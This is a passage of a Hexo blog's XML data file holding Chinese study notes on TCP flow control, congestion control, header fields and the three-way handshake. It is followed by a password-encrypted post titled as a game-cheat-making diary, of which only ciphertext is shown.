timer）。只要TCP的一方收到对方的零窗口通知，就启动该计时器，周期性的发送一个零窗口探测报文段。对方就在确认这个报文的时候给出现在的窗口大小（注意：TCP规定，即使设置为零窗口，也必须接收以下几种报文段：零窗口探测报文段、确认报文段和携带紧急数据的报文段）。</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221221929.png" alt></p><h2 id="Q6-TCP如何进行拥塞控制"><a href="#Q6-TCP如何进行拥塞控制" class="headerlink" title="Q6 TCP如何进行拥塞控制"></a>Q6 TCP如何进行拥塞控制</h2><ul><li><p>两个概念: <code>接收端窗口</code>（Reciver Window)又称<code>通知窗口</code>（Advertised Window),是接收端根据目前的接收缓存大小所许诺的最新窗口值，是来自接收端的流量控制。<code>拥塞窗口cwnd</code>（Congestion Window)是发送端根据自己估计的网络拥塞程度而设置的窗口值，是来自发送端的流量控制。 PS:发送报文段速率的确定，既要根据接收端的接收能力，又要从全局考虑不要使网络发生拥塞，这由<code>接收窗口</code>和<code>拥塞窗口</code>两个状态量确定。</p></li><li><p>四个策略: 即<code>慢开始（Slow-start)</code>，<code>拥塞避免（Congestion Avoidance)</code>，<code>快重传（Fast Restrangsmit)</code>和<code>快恢复（Fast Recovery）</code></p></li></ul><h3 id="慢开始"><a href="#慢开始" class="headerlink" title="慢开始"></a>慢开始</h3><ul><li><p>当主机开始发送数据时，如果立即将较大的发送窗口的全部数据字节都注入到网络中，那么由于不清楚网络的情况，有可能引其网络拥塞。</p></li><li><p>慢开始算法:</p></li><li><p>在主机刚刚开始发送报文段时可先设置<code>拥塞窗口 cwnd = 1</code>，即设置为一个<code>最大报文段 MSS 的数值</code>。</p></li><li><p>发送方每收到一个对新报文段的确认（重传的不算在内）就使 <code>拥塞窗口cwnd</code> 加 1，即增加一个 <code>MSS 的数值</code>。</p></li><li><p>这样每经过一个<code>传输轮次</code>会使<code>拥塞窗口cwnd</code>加倍，这样会使<code>拥塞窗口cwnd</code>成指数型增长。</p></li><li><p>但是指数型增长是非常恐怖的, 为了进行拥塞控制, 我们引入了<code>慢开始门限状态变量ssthresh</code>作为一个<code>阀值</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221224839.png" alt></p><h3 id="拥塞控制算法"><a href="#拥塞控制算法" class="headerlink" title="拥塞控制算法"></a>拥塞控制算法</h3><ul><li>拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢地增大，即每经过一个往返时间 RTT 就把发送方的拥塞窗口 cwnd 加 1，而不是加倍，使拥塞窗口 cwnd 按<code>线性规律</code>缓慢增长。</li></ul><h3 id="当出现网络拥塞时"><a href="#当出现网络拥塞时" class="headerlink" title="当出现网络拥塞时"></a>当出现网络拥塞时</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221225010.png" alt></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221225107.png" alt></p><h3 id="乘法减小-amp-amp-加法增大"><a href="#乘法减小-amp-amp-加法增大" class="headerlink" title="乘法减小 &amp;&amp; 加法增大"></a>乘法减小 &amp;&amp; 加法增大</h3><ul><li><p><code>乘法减小</code>是指不论在<code>慢开始阶段</code>还是<code>拥塞避免阶段</code>，只要出现一次网络拥塞，就把<code>慢开始门限值 ssthresh</code> 设置为<code>当前的拥塞窗口值cwnd乘以 0.5</code>。</p></li><li><p>ps: 当网络频繁出现拥塞时，<code>ssthresh 值</code>就下降得很快，以大大减少注入到网络中的分组数。</p></li><li><p><code>加法增大</code>是指执行拥塞避免算法后，在收到对所有报文段的确认后（即经过一个往返时间），就把<code>拥塞窗口 cwnd</code>增加一个 MSS 大小，使拥塞窗口缓慢增大，以防止网络过早出现拥塞。</p></li></ul><h3 id="快重传"><a href="#快重传" class="headerlink" title="快重传"></a>快重传</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221225950.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230007.png" alt></p><h3 id="快恢复"><a href="#快恢复" class="headerlink" title="快恢复"></a>快恢复</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230030.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230048.png" alt></p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230120.png" alt></p><h3 id="TCP如何判断出现拥塞？"><a href="#TCP如何判断出现拥塞？" class="headerlink" title="TCP如何判断出现拥塞？"></a>TCP如何判断出现拥塞？</h3><ul><li><code>出现重传</code>或者<code>连续收到三个重复的确认</code></li></ul><h2 id="Q7-TCP报文首部20字节的内容及含义"><a href="#Q7-TCP报文首部20字节的内容及含义" class="headerlink" title="Q7 TCP报文首部20字节的内容及含义"></a>Q7 TCP报文首部20字节的内容及含义</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230415.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230433.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230448.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230507.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230527.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230547.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230603.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230619.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230635.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230653.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230712.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230730.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230746.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230801.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221230817.png" alt></p><ul><li>从这个头部的<code>源端口</code>和<code>目的端口</code>也能看出来运输层为<code>应用进程之间</code>提供<code>端到端</code>的逻辑通信。PS:但网络层是为<code>主机之间</code>提供逻辑通信。</li></ul><h2 id="Q8-超时重传时间如何计算"><a href="#Q8-超时重传时间如何计算" class="headerlink" title="Q8 超时重传时间如何计算"></a>Q8 超时重传时间如何计算</h2><ul><li><p>TCP 每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到但还没有收到确认，就要重传这一报文段。</p></li><li><p><code>超时重传时间要比当前通讯的两点之间的往返时延大一些</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221231415.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221231457.png" alt></p><h2 id="Q9-TCP的三次握手"><a href="#Q9-TCP的三次握手" class="headerlink" title="Q9 TCP的三次握手"></a>Q9 TCP的三次握手</h2><ul><li>TCP连接的<code>建立</code>(三次握手):</li></ul><p>-（1）第一次握手：客户将<code>标志位SYN</code>置为1，<code>随机产生</code>一个值<code>seq=x</code>，并将该数据包发送给服务器，等待服务器确认。<br>-（2）第二次握手：服务器收到数据包后由<code>标志位SYN=1</code>知道客户<code>请求建立连接</code>，服务器将<code>标志位SYN和ACK都置为1</code>，<code>ack=x+1</code>，<code>随机产生</code>一个值<code>seq=y</code>，并将该数据包发送给客户以<code>确认连接请求</code>。<br>-（3）第三次握手：客户收到确认后，检查<code>ack是否为x+1</code>，<code>ACK是否为1</code>，如果是则将标志位<code>ACK置为1</code>，<code>ack=y+1</code>，并将该数据包发送给服务器，服务器检查<code>ack是否为y+1，ACK是否为1</code>，如果是则连接建立成功，完成了三次握手，随后客户与服务器之间可以开始传输数据了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221232008.png" alt></p><ul><li>补充一下TCP连接的<code>释放</code>,但愿不考,太多了记不过来了:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221232045.png" alt></p><h1 id="已完结"><a href="#已完结" class="headerlink" title="已完结"></a>已完结</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/946366941_preview_637865.png" alt></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>边学习边制作自己的游戏辅助(持续更新中)</title>
    <url>/2020/12/20/%E8%BE%B9%E5%AD%A6%E4%B9%A0%E8%BE%B9%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码似乎不太对, 请再试试 (•ˇ‸ˇ•)" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="47071212d231eb325b77e353337582cc774fa8eb6397ce66b5926e52cfc022c4">222d919fb5e4a244eb11cca8e6baa028c0f30c8382121190e10c73b81feaffb686e6d7bd352aab7b471514e76c8c000879a958414fb3d18baee8f254125f3d8a7eab4740c4fc4ec1fb12fc9804083e470b7468729711642397b7fddc737121d882f0d63f4efef2d7ec76ac93a01fc211e932c3b159fdb58825e71d380b082528ec60526df231085e8419c13d3c54aeb261362d23efb4d8305f64208053741f9386808fcce99f1498f83be328c55c9e8c7c42a51c970de946a7a4ac8c5cc238f3233681bcabf871944de559d097a6ea591b3670a20ce46312303e4dd76c6f4504efab30e10fb61271c93e43f358f194855d315794fad86c9086380812a0bed834266b6110ddf992e1379b11ebf38ed3dd317292f5cdff92f736c454ac9081d1afcab5ed100a96dfbfcf6d361a01ff7bae4169cba19dd929c066e2301036ca3603b512319b4189740af9180bb0dfe803d3ffe5dbff7ae7532ba8b5cdb399e9d14b7377c39ad6e9d5e3acf879bfe02ee28a5a421a7aac66f8fc429017292b28f96ccca885ff896a7edd59ce0b6ce1a7499342e3515f5c7667763b5f6db0f8c655c8778d8309d6db7e25fabc001321c7f7fbd9487e804e0ddcda1aeb48361fda71d6ac3671f2aa3672ee9629b38afc8904bdcbf485c4f56a4bcf0aeeeeebf7e998c608a19cb5727fd2e08689ee9e419ab2227310652b771eb0bc6acac08871b7cb81e5df54107cc5afe0e33bd3e51084fe53d2450c50245944a834f2f545d539a2c279293f1896fb1a6a856a595543cdc40da88ba54777a73249b1d23a79f680a5c3d9e1972ba6cdfd83de91dffe0a70b733e0e610b2f8efc9d1d054a44ab01c58398ebeabcf496a13086aae697ef4ff6cfbb04b139123e3a2e06d409dbebb4bd2301e44185120a3b47a594c7a39561314f3158cade7b9b1908429d59ae6071d9c8a8e3125422f3b5be7354811d67016a0327cca32fbff832592577b413a9a8a466265c024d456a5bddc35bf27f491d243027d7d7e1d77f3b08b385f907a6d83324ad87564c8c253b1f40219f92842b6451e1db0352edea4809b1c48ffe3e143559dc55ffa500294c3d0820e961979b6297865b873890935a6a53bbfdf387fe7c440ac9824a7831c13f868432aca72fe4f9de64ba33e267608b5bdad1f7f39ed11089d42cd70212d40a4759dd2de9a8c275f3bf7c8fd085a32be0dd86082eb57b43c15ff9862168704a4d521c2a1ae382396e4be05ab4eaefc0413f8a32eb69e1db8f9ad85451f852848d8d9cadf4f6eb15126599f079f790badbad54f28a7ed4038244a886e9da6005d6ed4b6ed4d58fae9c146af3f19c2879a9afcf77becd172f1343a708732afb19fcce62e166673e288a07c70dfa51165c93aa9b3cfc6a4b6e540f908e2c28cb51a415d8670bc45604a91c9934043a0481d832f6572e901e1958da2a7c3e08af5336a1a9405bf54fdee0102e97120c58e415eb080b9e8859a8ad20d84d1e98282c0f441dc898f06b8be56306fc6adf07130009e4851f08691497c09e249dd64a14ca1762a2ee9257080998205431e44de79dfaaa90bc0b8953369518a49e2b5c040cfd561230924bf734b4b017d0228c6dac94a680d59e5030b1c259628c0abc7f6db6f139a0ec7e9510c38b2e2f77025f377663965a63b2f4587976cdf69faaffbdeacce8b14bdda71a1c1dad41c2a73dae25142c0ef18580c80acc1e1fbe2518d234786c6ee3f19368a78abff3becc21562796838dc0d6ed42681c38f634bd87622f63137a0a86ac4ca81498dee84c59ca8c871ac96f3fcc2b068ffaa9c39e32f0b93d8ae51a336a0f0871352cb0825a541cc2262c9aeae41008d7948fe8e7fdcb6afb1fcccfee8c25c2b6bdbc8a38e2b239f1fe8dc0264c9f90f3b4f210b5f4724a5de6adbc262aacbfd03b47896a9d5a1cbc9ed61f850d3596c4e6f25257e5f09e42d93f3e75324a1a90bd0c5cf2e5bb225996550d914f1ef294b9b4be32e64d7a99cb8473d09af1b5545d2935d9265d0b6de07e5e6bcef45a958c25c26bcd93f7f9337a3601d32e1971556268f9a6f06c407b891d28c617e2c6aea4338e48d4492198a0f134b1056f7d092f65a83d524c7395a3859637f9d546f38ee275724c3a8be92277c0d12c37e428c4578a1c567a4bb5a00d18ab8a13dc3eb698719c09637e6655b0f20adafefff70488e5f929e082b21b3efc57f7c4b740fd580bbf93ffc6e1b52519b3bdd676bed2da6fa26fac8baa4af5aa14d31a6f2f785db323b3dbd77137d8eaefd32c9098d7a8081dcd0e6a2894df8cec549a368a841ca02829726c17c3abcaa904d0a977851885f02e3f1cdcd6a04b41c00584f59d832f97c762df994c667300d0bdf5c0534f68789233681e2977379a219a5e4ac12a8aa6ee7a42352c14c25819e69d3e12691969f4673f282cb1527a241dce4913012904cfcef5abd267d19113b9008c703ecc4a0c842b09646f7bcd8d15da10a5443c3c824b01399fcf59f81f6e6c8286f6db95d9cab88fb42d6143f05f21f897b7317106320de6622b35e23307d35d9253dc795abdd2c80d0a3db428b08858858019e90a01c2040f4c4d270be72f3aaf00e23fc51aa7d22749d8eb1dabb163f530f9c85648288d935888f0c7a5a31cdac5a1d2c82b701891c5a4c09bcd2fa4d7b7c254dc552a100d1516dbdb75072723c283243a84562e24fa6f030d1bf6bf6c4dd21372a944c94bb0c1230f11a2281b03fe89f373abdffe56852b01b509a3fe206aadd40675cddc655690ade59f3ffacf96bd4a5570473909e3b77a50c5fe77b486d2a80e4589c9e4f3421d1edf04c26d3b008ea238b143cf300aed04e3ec3480e98948c0d3c99ae479f789c2566a63c95f63331da2adf7e71293b92c1328ebe159bc2add5073408c871ace918dc0aa0dd0566fcd8530215898a4d83feabcc5eee9092c665a2bf3eb93ab13b68853fee8c890c8a697987e230c48cbcc14f65c82d0eb40f0d70d9f6ce4f83237166117d312f680c4aad1779e58116a3f411858eecc90453d561a60ab0d490caa71cc12a72af33d30715fb70fb4b2440da213e8270503938256b2c860d80bd85bee2f03f2b2068ef44970e7d2d77cab058bc3a8f65f952cbef856f93865ca37adf2972dab5a170ffa12f9bbcdd85d044920ac0de983f23af5cdffaefe122449562950fdbd8e881143b98685448357bd3947aa58c6e3777e1972b2a81519b3ac6c39ea55c84dfc8e7634dce0d7932813dd332360295802e606084c72e720e58ad1a790589e11147fd17c22c3e173d8199035b033f441914cb5d7eecf5158477ff9f6bbcd4f865ba9ddd9d5ed7cd0a282120a30c7081cdd7e54d4bce931dcf474766d4436a896e12ecce33016891956f28e9f974da3a86dcd64f18f49be14a6dcca4cbf6e4f22f037d8840541423da4aaa436d734af9906c1612c727bf9f42cd2d755017795c48b206ff48ee80a61adabb4f0277e22e2622b2abd8fd261510052d1eb583e6e782efa3725be6aace13b3f8fc2361ae33eb1b411b9f07f614999cacfd3a1762a4c9d2a6bc2d69d0231554275c5ab4bfa28ebb0a72712b2365c171cce4efb8598e114530a922fa015566d29829df297480ebde21ba6d466ab52a45e353020f68a4cbc8851b5c463442b6d06b6a711023f7e92cd6926e81320c7a090b3c1df3c9422159870abbd0e7757ff5ebc660a7e9831ad966dad9b2a42821b0433e1e8e74378485c21cc3acbf6ec721e26df074fdf1fe2f1e91cfb1bf9c7a6e9afe6bf5b5b31cef5a206d3a32c708cdb6f324ce9c8df5fb38c99c5b3a233005098952ef9e02a748b626931fcad6a093a02b6897c3c95ea1052cb826a14253e5b4b9f734db08f5f342d8bfb4118dba8b2981aa1806aa7d1596066411ce1084cc3580a9ce4abda1aa2d3df95de441ab76bbeca8e097e711a5d6593c82b056ecc0c1f17a1ea4bfc9434927cae99a265616b4cfbc4ccdb60c9cb225fb00eec255b5b9f2f705be484e74a4cfc3f67157cedb4be7ac28c5c0db19490568d2d58859d1cd3af875d6d8835e4d72ab6fe896ce9b30649e34a31154493b6a20e8099fee61512143d40f8eaa46db06e0932841e2fbb9d3147a4d8d0c31e132effd8ccb3ef0941136bbe9eb552c8d3ed870ce163148be83b3397a1f38d3500a744d78d932c2700cfa8a1c5c083a51bb6d4d8ef85307935ebabdd5e5452efb1d87cffb9ae2df7fbd6726c16e217474318385dbc1a80bc7c710800eda5b4c30de56d1f63231071e0a6683c4465759cad7775c20ae7219f73afff65afbc68acab956635791b8014b7e5860848588a1895566cc2463607865589167524a395a5802f38e47db0bbc4031da328dad0b7b39c1f7830805f019c44b2e072d0b6cf54791a8978d2f6c403a777eb25ce7269005c8d000e94180d79475380968e2c49e6310e0931ce1e917032a38df6e12fe3131142bcf30088705d544053254b68fca7afdbe6f3e011260fc2e9aac6a21a4973fd90904fbf709b29ea9c5b4146ceff2e48d7fc8749ad2805844ea53ff263347f37f73b8ed7e5375c139d1fe6deb3470d7a0563facc463f90db2860d531ada1d0bcdf3c368d5a30bf1a00d24cf22997ae375b7a13cdcc4e80acb6f81c1421eab384cf910ec4f7b5c3885f6d8317cbf82fbcd37954b2bb36d83748cc1ea4612e673f2e24537e404e8fed12fd75182215138acfbb614b23ef77531bd9776a381fd67d2570207b7222982a8d1c6e4cc08671aa485567a68989ab036abee01d5c7de4851e418bfd432e5b3d9b7dad7274440c83d0a371dcf7f23b00d22e5a5c9440dc5ddcb1a47278e6f6617b766a128c5525df2c8a09964355bd927ed328042aec22ff307143e1c4bdc556f33b6c04ac26cf9d199b83a05ef4b4a7c78cdd54ddc36f9aafa61bd5a1fc8a34b2712125908b5ada162cd6350cd0ce049a33b36bcc558888506faeefa6de88634ce45b8c07a6370cce687c2854d8377925d07e411e3ba119e43dc7cba4cffb56998a2ca4c83bc0f2b4c3e6a091a54602ef6cb617c22d71fb36e79488d23522964694425502ecedb4d020e1dc0d2487beddb1d00f590e3c0e4590ebf4a632fd64f6b605310bf0b225a3f2126b4c14f82b789146c4f7ced8223c59d275b5a583092f6b65c67bbef7fd2bd1663dffca0033e96f3235c07c487a159b5d8b8599fa6658d5bc0aa4b5930c87740c5d459d284b01aa82b90b4cdfc4670945f6cb6a308f0495204c0b0b68f744a8d5356acb3368c161078dfc26254595f1c4f4122d573d82b018207655635a1cdb165f040dc59ebc78198bcf6a38cc0f43c186ba8da9dc21ea4d612cdfd22f9215e9895dc9106b1377d5380df11d843c730675e984d8d9408159e9d3c572cf3c293ea3eaba7961218c278183fa5ca5b1553b4c4442b1e6bec1516b28ffc033c7e4146f94c0614182351f332064f877c254b2a6abb059d1656686540d1a345d0f911d77dc9325a4e982489e0456c316327c09cb625b3ceef900eda940852cc139b967dbdbaa2ca93ac7bec66c892ec587a26e12f44f01bd9d135e50448890299e602971817a9a43b0fc7eabae93cbf41f8dc1b79525c9b169c88d1ea1151598672714f59a84b894f0f3412d1c24c8fa096fc7a7564cb0b2c10ac9c16c1bce97c018546f27805da37665cc0ed0d8b6d780ac7cba955b3fa474b3980eeb2b717016ff70ec134ee051fc87783cf698780274dcff77d57a280f679794773047b8e08f590789100988c7e723f849a2808cdaa3de9896b2c997d99226dbc26f76564be4b8b29f4692a872a20dea4736cdcafef0b78969d3a040924ffb605c3594cd979f8257ca62db801c0fe18cf4c360cfeae6777d67eb916cd96e5d08d1bec6ab9e3ba17c7f568c36f99f89300045572146fdf92b0b089a2909810388a3f459f84289c45726ba36114dbfcb00685500b93ab68f8eb1c2306743acfab0e0f850b22c0baf81da0612c0bd3a0938491d6ea92bf3ddf8636206cf31b996485c6289677c7579918a4990b1da227a2086d49d164b67941969b025002bfa915d228959193a96803ae866ef74f4f40a815e720766ba7ac75d9f32001a96cdc08bfcd1dbe49a29c0a7c2dc0b6390c323ede51f59c6d3f61c85ebe8077244a237cdf8bb43e1dbd5928438c8914e0c5b1208cbd1efd12e8fcbdb81877807cdd0f531dc32c054a53ea0ce0ec907770018bd60d91c5271808f26f7fbd6d57c99553c1fe34e0dfcca6e887a9887fcff6ff7208ab4378744fe9ca06c945bde49bf84f1c5f859636f7504924f2878204bfafbe1ff0577fdf8a1246c04fb1de59c3c2261272c61fcb5b897a9fe53ce63bfdeddef697ea41b694a4998133311d2917eae2730146ecff88d96def46f21858b4fef30c41713fc8f3661eb99296313f418d9172e18b0a0a872a7ef7c27e5b7998b6437f4e08399a585d601c367550d2fb229f8d6266a17544b9419e7b53c3c12ecc9465aa8298cdd978c518a5a06b9adddbace21191f89c22bba0cffec687b885d2b729425bd7d64e5b12260c31e4d941a52fc585fa328662a31216c6626aeb6935d680531933e6bf38cd4dc44ae96aa097661e86c9edc1fc547501aeb3c8a57e5a1a1ca84dd86d69243684e4256775399baf3c525aa6af704ab179fa3a5f50576819ce8143b0e39dca9e5228dfc63b5eeb2ec61e321f561a54fe8d23d6ae0e44f31e8fa328cc99aa3fc2bcdd5bdf6228acebb9acde78aedc3d10b27ed86148541385e0f81e4746150853ec8ecf7d23d4f7bd5abcf299c1f30df0e2705575ef21d790d4861feb4fce499ead71f47fc2782d133aea984ad1e42740f9e157337358719989c150ff20562d60e6f812017fa3e6f7a5d3ff7b13e61ea3f2e745e4098bdff0c295504f4d0efee6d70f88fe4be53c45a30d74baf51eb5cb444ae154c5c8c74f5d24b360da5a00d3baf0dbb4d9c57151d7487d306c86fa47aea91c5278888bce297c2f3b858ae7efa58c485ea5fd343095f3ea3c81bafe7e3161557732c9238f8a28dbaf2a9192b846a2796171fcade61a9f41d8a20297a74d3dc1608db50943bdcda1a4266d75ee145517d9183bfead4b79c7c8a61f3c1bd52b78d73737a4869771d27d5a516142c03797ba6bbaca8ba678cb81f4fa8cc6482eed8d806407dfb9350cc23b1e695ffc8bfb25645bbac176c6edaa29322fdf1509e6a2b8566b8dc383969b2e8cd3f7df563342b9f84003787f6330a7edfb38a84f574c20c877a2a0d2a331319af656435960c64f84c1513ff2c5a94af5da9691be9379bf7be9be077f39143b62ea74a7b23b9fb0d633019495df36c758c96dc6716bd27179ac0333d656d9eee8c39aa70308703f58f233f971c3c6970bb5aa527a082b8383ade2f5e3f1010687a92c0e59fea17a8b4710595ae428ff4efa1a34814c92d90a8fa37f8044ba8ecfd96e2b6199365fd04a249866d42fe659a8cd4ac95b6bd9b4d3646bb4b0323202e7d0bf78d7ae4ab9547e1761d685996621fea0b4a45bf9a7844a25527763d045838806b0917b58c1ed4377fe6e4dc17a1321f857438360254ff958d758f6374fddf2be40daac2c0b7b190ad19cbc52104cdb9d63544abd0672445ec9d9bb5f51b3fd2b2dd51dcc0af595f9f76505341a12cd657514a23f1549e75405db8e3978ca77211e7342511c872e8bd169c0aeb1f6c6a84273e2cc1c37dd4d458b297b743d498b14fbcf2b0325b1c9b618dd6fa5cb3b79d7fb433437992556ce9a0fb8943430ae9c9a1e126146e00e905b68587a9e7b6f9d790684bce3c871f8b0b0078bea2e0d35651740357f1aab18ede85c231f694640b809d826d19774973acb74b9779bb519735d1d5b916c236b48013cc591488a943337735a855c9e01472744576a2b8942fc1fed61a7f664df28c154c3c14636da84eca8818bf47c44fce816deb41c30b979ce67be52052f3211d070b52cb28c6b15467f49724b678ea7d0972870d65ade141f45bdc56bf59fda4f6d3136e5fc488e55667caa41d35e4bad725471ab655cf1f68119da205bde5c62aef7550bd1243f119ad16dc524c24c1bb0e39e2f6b4174cf29d7daecfdb3d661b45c783405b9d1ebc8320736172b6ca6ef74e5cd76d39a203d262892f9e67da4b1c3724bbfac8045b32c26fa842d38c73f229717e34130d8ff524d3e5ba682d8b4ec8bde3a6c74e914164a76c69af553b61b5002cd5efff064dbf27b608b0d201fbab76829727ef8ece64e86f921b17a424f292c4942d04115722e0f3e60586ac14578a9f4c61ba75d24594fc3701e54d09ccfcc31a2b9617371eade88d2d292410a2934c0921ad780d91b521be884714e705902bce8570973b1b816f66ad0c6055148e0a44a69576ad0033066f0de7aae573fc7e6926644f0f13ea554ea8bb9e49db57255cf68a72b0a433a672a782fd82b26deab257076411bccce42e3d414152c15dce8c09876e6d71e2afd89c21521e40bab1f341dc55763bbad0cf04eb273043071863174aba3949191d8ebfe6bf3ca30bb0c70ddda2600a917c7b3282554df5eb9643f57cd3e769974a5a4f3d6e63684ef9d7e863ece2d452241e9db4cd3a568525ca4dc8f6992795de0f8b1bf33d0ca71032aaaa34ebfb8eb34df7c557771847e19ba26f6273912491855afdc8ee2522da9a17ba11e03167af97143a6fb76abff335dd53c090809f2ff1a65667739df3b2910c545cde1cc7274d1641176ab668829e21773a521777b75f845821db591ebb8f48a455ce97a894731fed22c1b55631bbd59ffa0b6babbeffb215bb85b5ebbac845d894f228f8490a139a77b0986f1ede09beb6cd93ed2a0bd7e80f60415618d96d8bcc34fd89ff8f718a004d641718bd943e219fde6493d14873f8e002a8841dca6f6fabcc17b637b59e1cf3722a97a065bd6218d073740d90d34a66df645783c2bfa2445aba5545342cb29c324289a80bded28d1f7f37b8b4f9d32240e95decde969f8927fc1e42d8c0743c376e33cb12289d66a8954a66793541dec21a979b078bfeb13dea90fd55c62bac6cb2dbce8f40d383ab9757f0cc57960cd0a49b7cefb9686ad3eecba889eae7d3e79211a062e3fc58ec128a90400c1abfc10f0c1246dd7c4c785fada7190b47da64a931c7b4a7a9003cb81e0a96f8fc3d15a7488d9fe6741604866162f4f128089f59700bb9ff7fff072cf9e9c9d834abc256793e99b0456b550548e3d9ecd56e017d93fbbec72c77287f5f8ab66bd7ed0b0169b34893608ce7d83b31e01af69ce7fa8968f3847345f036b2ed24a40ad7568f9e76cdfab75ed5204786912aabcf0831b94c27430c50707f2135f7a22d44a124233de057b98702432d55319011510f79d96174bc571fca20b661140e546c55be55b831529ea5d04071fba4fe1ff65ce6422e28a367574d071ae9d6d4ab95dbdefa95eb3a58f190c1a6e588b18cbef198b4b3053fb3c3d68032dd9459dc8cba7cb0e51fec269fcc7eacbe22f010174d5a62d54f34ef24ed2c13c2867f9ade5456b5de4a78b98c98b5b64cbdc4f7a447a84d3c461dd34a5541d5fb4b8e17a2ea0ec85c19f2de2705f811fa3a952aab2d8ef525710c22f2040b1d76d99ed39e8a19362261635631c6f53466e608bca95ab3d70f6bd5f085f56d182cece3a130b0ac29a8b7c328ab9d3a4ba72c903a0873406d0c6851e7c900fd2bd2544ed79372e472e6a0f2ce1f0c3b93931ee81770f2cb3781afc251ce4d31beeb4cc69f63ad6d6eddf5ec09a734f0b3f355caec8a626f65736256c56d4f4bc52de1f0881d7efce624ee127e50ee4fdae88d7e97958c43c04d69bbe90f09cd5e5a3079f88d01aba2ae9a61c35f800035dba87d7cb5e8f965d690e21e77afbe05a20e0033842f769cd9f9c47712c3d08031de0a280aff384bc46b3921fa624116c74e50770fdc7a7f552727f3aa6ae43fde0acd3ff73140dd0ea29915c303e9557f1e07761a946d5852e30ca7434d38d91b0fb77f2fa13b322db4b8931b694839c3cd18b0902450460bedbb2b5328a7e6aeb61f3a1ee40e690e33196593a63cb61dfd8b95162a4c692078cb2eb2a242c7f4b7f9da69f1d5eb7802f60faf1016a37960b885c407e64eef3d55c91a00d6c3b48b2b44d4450748ff8f2a9256e71ecd2bd5be94667bbfe174f89cdca88bcba320327565bf4a10dc670d333c97bc35700d138e4000e1a04b2f6339e7bb35925f84d78cd8fe71877c9171fff6fb9eac848c0d15edf062c126a91176248678a5e9a29965662f9b645bee73dd807676b1d398e416c5e1530a2c00972ed22ae9c64411c8b2d9cb50329aef2ca1a00c409e8cb5e9930048a0bff724e42d1f2610391bec42974cf00f1f7dffb7248188311288494d9097b2ad582df6a7451ff54ef7c06fe32e4e483a39bd3ef36d5c3cb81079fe235f1a9e63f1763e78c6fe688e1d2e8726176a4bce11396e032ee089958bf4bd1b8160569bf3b86e12ba8931445cdfcd8c0259045abb0bc9ccfe7394829f48cd5375769d2bef2711308b5bc7b88bc66711d05d3c862444a794dd8c40da74675a0b8d31b4f3d556a2db1e6e62cc29ee59782d9643431138ac283dfe7519b14d1507eab04d498c3400569965cd2786d274807722f944abacb0308f025559d25f13f26b89bcabae5558d9682848717fb8e61eac8416cdbf2076e583fa216f9bc1b23c8af480dabd8eabe4ed106f0a9de6fdf8754865890e557aaa9ff33fa504eda060d47c1c7163bb02f488049f0f117eb55833541aaf58e29a6f81726a621c9e90e33eedeb6ad69dc85747a1684fe40136d1a6c96f7c0ef58817ea01368537e6ecba8d72c417812b3722bdb2f77edf3844559fec6e323fa4eb5f5ca6ebdb21a05b656bd766abfc41a9a4a5dcf71f3236556fd2a8eca5b1e2bd0fd0a7f60c95f839780bfa036d9ae0f